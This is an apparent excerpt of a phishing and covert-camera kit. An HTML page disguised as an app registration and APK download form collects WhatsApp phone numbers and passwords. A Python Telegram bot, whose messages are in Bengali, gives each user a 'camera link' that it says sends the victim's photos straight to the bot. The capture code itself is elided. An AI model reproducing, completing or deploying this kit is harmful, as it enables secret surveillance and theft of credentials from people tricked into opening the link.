...
<body>
    <div class="topbar">
        ...
        <button class="btn-apk">Download APK</button>
    </div>
    <div class="hero-card">
    ...
    <div class="form-card">
        ...
        <div class="form-group">
            ...
            <div class="input-row">
                <input class="country-input" type="text" value="+1" readonly>
                <input class="text-input" type="text" placeholder="WhatsApp phone number">
            </div>
        </div>
        <div class="form-group">
            <label>Password</label>
            <input class="text-input" type="password" placeholder="At least 6 characters">
        </div>
        <div class="form-group">
            <label>Inviter</label>
            <input class="inviter-input" type="text" value="USER_CODE" readonly>
        </div>
        <button class="btn-register">Register & Download APK</button>
    </div>
...
def camera_page(code):
    html = HTML.replace("USER_CODE", code)
    return html
...
def start(update: Update, context: CallbackContext):
    ...
    keyboard = ReplyKeyboardMarkup([[KeyboardButton("📷 ক্যামেরা")]], resize_keyboard=True)
    update.message.reply_text(
        f"👋 স্বাগতম, {user.first_name}!\n\nনিচের বাটনে ক্লিক করে তোমার ক্যামেরা লিংক পাও।",
...
def handle_message(update: Update, context: CallbackContext):
    ...
    if text == "📷 ক্যামেরা":
        ...
        link = f"{BASE_URL}/s/mq/{code}"
        update.message.reply_text(
            f"📷 তোমার ক্যামেরা লিংক:\n\n{link}\n\nএই লিংকে ক্লিক করো — সরাসরি এই বটে ছবি আসবে! ✅"
        )
